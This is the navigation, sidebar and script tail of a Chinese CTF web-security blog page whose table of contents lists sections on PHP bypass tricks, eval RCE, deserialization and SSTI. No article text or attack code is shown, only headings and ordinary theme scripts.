toc-level-3"><a class="toc-link" href="#HTTP%E5%A4%B4%E9%83%A8%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF"><span class="toc-number">1.2.6.</span> <span class="toc-text">HTTP头部绕过姿势</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dos%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">Dos命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E8%AF%AD%E6%B3%95%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%EF%BC%88%E7%9C%8B%E5%BE%97%E6%87%82%E5%B0%B1%E8%A1%8C%E7%89%88%E6%9C%AC%EF%BC%89"><span class="toc-number">1.4.</span> <span class="toc-text">php语法快速入门（看得懂就行版本）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%9A%84%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">1.5.</span> <span class="toc-text">php的正则表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80"><span class="toc-number">1.5.1.</span> <span class="toc-text">基础</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E9%98%B6"><span class="toc-number">1.5.2.</span> <span class="toc-text">进阶</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.</span> <span class="toc-text">php中的一些技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E4%B8%8E%E5%BC%BA%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.1.</span> <span class="toc-text">php弱类型与强类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8E"><span class="toc-number">1.6.1.1.</span> <span class="toc-text">&#x3D;&#x3D; 与 &#x3D;&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#md5%E7%BB%95%E8%BF%87-Hash%E6%AF%94%E8%BE%83%E7%BC%BA%E9%99%B7"><span class="toc-number">1.6.1.2.</span> <span class="toc-text">md5绕过(Hash比较缺陷)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#json%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.1.3.</span> <span class="toc-text">json绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#array-search-is-array%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.1.4.</span> <span class="toc-text">array_search is_array绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#strcmp%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-php-v"><span class="toc-number">1.6.1.5.</span> <span class="toc-text">strcmp漏洞绕过 php -v &lt;5.3</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#switch%E7%BB%95%E8%BF%87"><span class="toc-number">1.6.1.6.</span> <span class="toc-text">switch绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#is-numeric%EF%BC%88%EF%BC%89%E3%80%81int-%E5%BC%BA%E5%88%B6%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2"><span class="toc-number">1.6.1.7.</span> <span class="toc-text">is_numeric（）、int()强制类型转换</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-eval-RCE"><span class="toc-number">1.6.2.</span> <span class="toc-text">php_eval_RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BA%9Blinux%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">然后就是一些linux的基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.6.2.1.1.</span> <span class="toc-text">Linux系统的文件结构</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#linux%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">1.6.2.1.2.</span> <span class="toc-text">linux的命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8DRCE"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">无字母RCE</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E7%9A%84%E4%B8%80%E4%BA%9B%E7%89%B9%E6%80%A7"><span class="toc-number">1.6.3.</span> <span class="toc-text">php的一些特性</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%A0%E5%96%9C%E6%AC%A2preg-match%E5%90%97%EF%BC%9F"><span class="toc-number">1.6.3.1.</span> <span class="toc-text">你喜欢preg_match吗？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AE%A8%E5%8E%8C%E7%9A%84intval"><span class="toc-number">1.6.3.2.</span> <span class="toc-text">讨厌的intval</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#date%E5%87%BD%E6%95%B0%E7%9A%84%E8%A7%A3%E6%9E%90"><span class="toc-number">1.6.3.3.</span> <span class="toc-text">date函数的解析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#realpath%E5%AF%BC%E8%87%B4%E7%9A%84%E6%96%87%E4%BB%B6%E5%BC%82%E5%B8%B8%E5%88%A0%E9%99%A4"><span class="toc-number">1.6.3.4.</span> <span class="toc-text">realpath导致的文件异常删除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.6.4.</span> <span class="toc-text">php反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%80%E8%88%AC%E7%B1%BB%E5%9E%8B"><span class="toc-number">1.6.4.1.</span> <span class="toc-text">一般类型</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8php%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="toc-number">1.6.4.2.</span> <span class="toc-text">使用php原生类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E7%9A%84%E8%A7%A6%E5%8F%91"><span class="toc-number">1.6.4.3.</span> <span class="toc-text">__destruct的触发</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.7.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">1.7.1.</span> <span class="toc-text">判断模板引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E7%9A%84%E6%B3%A8%E5%85%A5%E7%82%B9%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.2.</span> <span class="toc-text">判断模板注入的注入点方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Smarty-SSTI"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">Smarty SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Twig-SSTI"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">Twig SSTI</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flask-Jinja2-SSTI"><span class="toc-number">1.7.2.3.</span> <span class="toc-text">Flask Jinja2 SSTI</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/04/14/awd%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87/" title="awd中的一些准备"><img src="/img/loading.gif" data-original="/img/1.jpeg" onerror='this.onerror=null,this.src="/img/3.png"' alt="awd中的一些准备"></a><div class="content"><a class="title" href="/2024/04/14/awd%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%87%86%E5%A4%87/" title="awd中的一些准备">awd中的一些准备</a><time datetime="2024-04-14T10:59:03.000Z" title="发表于 2024-04-14 18:59:03">2024-04-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/04/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化"><img src="/img/loading.gif" data-original="/img/32.jpg" onerror='this.onerror=null,this.src="/img/3.png"' alt="pickle反序列化"></a><div class="content"><a class="title" href="/2024/04/09/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="pickle反序列化">pickle反序列化</a><time datetime="2024-04-09T09:41:08.000Z" title="发表于 2024-04-09 17:41:08">2024-04-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化"><img src="/img/loading.gif" data-original="/img/34.jpg" onerror='this.onerror=null,this.src="/img/3.png"' alt="Java反序列化"></a><div class="content"><a class="title" href="/2024/02/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java反序列化">Java反序列化</a><time datetime="2024-02-20T05:21:08.000Z" title="发表于 2024-02-20 13:21:08">2024-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/02/20/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化"><img src="/img/loading.gif" data-original="/img/33.jpg" onerror='this.onerror=null,this.src="/img/3.png"' alt="phar反序列化"></a><div class="content"><a class="title" href="/2024/02/20/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="phar反序列化">phar反序列化</a><time datetime="2024-02-20T05:10:59.000Z" title="发表于 2024-02-20 13:10:59">2024-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/01/0xGame-2023-web/" title="0xGame_2023_web"><img src="/img/loading.gif" data-original="/img/24.jpg" onerror='this.onerror=null,this.src="/img/3.png"' alt="0xGame_2023_web"></a><div class="content"><a class="title" href="/2023/12/01/0xGame-2023-web/" title="0xGame_2023_web">0xGame_2023_web</a><time datetime="2023-12-01T06:09:58.000Z" title="发表于 2023-12-01 14:09:58">2023-12-01</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2022 - 2024 By <a class="footer-bar-link" href="/" title="1azy_fish." target="_blank">1azy_fish.</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size:1rem"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display:none"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>var HoldLog=console.log;console.log=function(){};let now1=new Date;queueMicrotask(()=>{function o(){HoldLog.apply(console,arguments)}var c=new Date("11/11/2022 00:00:00"),c=(now1.setTime(now1.getTime()+250),(now1-c)/1e3/60/60/24),c=["欢迎使用安知鱼!","生活明朗, 万物可爱",`
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,"已上线",Math.floor(c),"天","©2022 By 安知鱼 V1.6.12"],e=["NCC2-036","调用前置摄像头拍照成功，识别为【小笨蛋】.","Photo captured: ","🤪"];setTimeout(o.bind(console,`
%c${c[0]} %c ${c[1]} %c ${c[2]} %c${c[3]}%c ${c[4]}%c ${c[5]}

%c ${c[6]}
`,"color:#425AEF","","color:#425AEF","color:#425AEF","","color:#425AEF","")),setTimeout(o.bind(console,`%c ${e[0]} %c ${e[1]} %c 
${e[2]} %c
${e[3]}
`,"color:white; background-color:#4fd953","","",'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%')),setTimeout(o.bind(console,"%c WELCOME %c 你好，小笨蛋.","color:white; background-color:#4f90d9","")),setTimeout(console.warn.bind(console,"%c ⚡ Powered by 安知鱼 %c 你正在访问 1azy_fish. 的博客.","color:white; background-color:#f0ad4e","")),setTimeout(o.bind(console,"%c W23-12 %c 你已打开控制台.","color:white; background-color:#4f90d9","")),setTimeout(console.warn.bind(console,"%c S013-782 %c 你现在正处于监控中.","color:white; background-color:#d9534f",""))})</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script>var visitorMail=""</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async mobile="false"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload='this.media="all"'><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors=["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"];var pjax=new Pjax({elements:'a:not([target="_blank"])',selectors:pjaxSelectors,cacheBust:!1,analytics:!1,scrollRestoration:!1});document.addEventListener("pjax:send",function(){if(anzhiyu.removeGlobalFnEvent("pjax"),anzhiyu.removeGlobalFnEvent("themeChange"),document.getElementById("rightside").classList.remove("rightside-show"),window.aplayers)for(let e=0;e<window.aplayers.length;e++)window.aplayers[e].options.fixed||window.aplayers[e].destroy();"object"==typeof typed&&typed.destroy();var e=document.body.classList;e.contains("read-mode")&&e.remove("read-mode")}),document.addEventListener("pjax:complete",function(){window.refreshFn(),document.querySelectorAll("script[data-pjax]").forEach(e=>{const t=document.createElement("script");var a=e.text||e.textContent||e.innerHTML||"";Array.from(e.attributes).forEach(e=>t.setAttribute(e.name,e.value)),t.appendChild(document.createTextNode(a)),e.parentNode.replaceChild(t,e)}),GLOBAL_CONFIG.islazyload&&window.lazyLoadInstance.update(),"function"==typeof panguInit&&panguInit(),"function"==typeof gtag&&gtag("config","",{page_path:window.location.pathname}),"object"==typeof _hmt&&_hmt.push(["_trackPageview",window.location.pathname]),"function"==typeof loadMeting&&document.getElementsByClassName("aplayer").length&&loadMeting(),"object"==typeof Prism&&Prism.highlightAll()}),document.addEventListener("pjax:error",e=>{404===e.request.status&&pjax.loadUrl("/404.html")})</script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div><style>[bg-lazy]{background-image:none!important;background-color:#eee!important}</style><script>window.imageLazyLoadSetting={isSPA:!1,preloadRatio:1,processImages:null}</script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})})</script><script>!function(r){r.imageLazyLoadSetting.processImages=t;var e=r.imageLazyLoadSetting.isSPA,n=r.imageLazyLoadSetting.preloadRatio||1,c=a();function a(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){e&&(c=a());for(var t,o=0;o<c.length;o++)0<=(t=(t=c[o]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(r.innerHeight*n||document.documentElement.clientHeight*n)&&function(){var t,e,n,a=c[o],i=function(){c=c.filter(function(t){return a!==t}),r.imageLazyLoadSetting.onImageLoaded&&r.imageLazyLoadSetting.onImageLoaded(a)};(t=a).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),i()):(e=new Image,n=t.getAttribute("data-original"),e.onload=function(){t.src=n,t.removeAttribute("data-original"),i()},t.src!==n&&(e.src=n))}()}function i(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",i),r.addEventListener("resize",i),r.addEventListener("orientationchange",i)}(this)</script></body></html>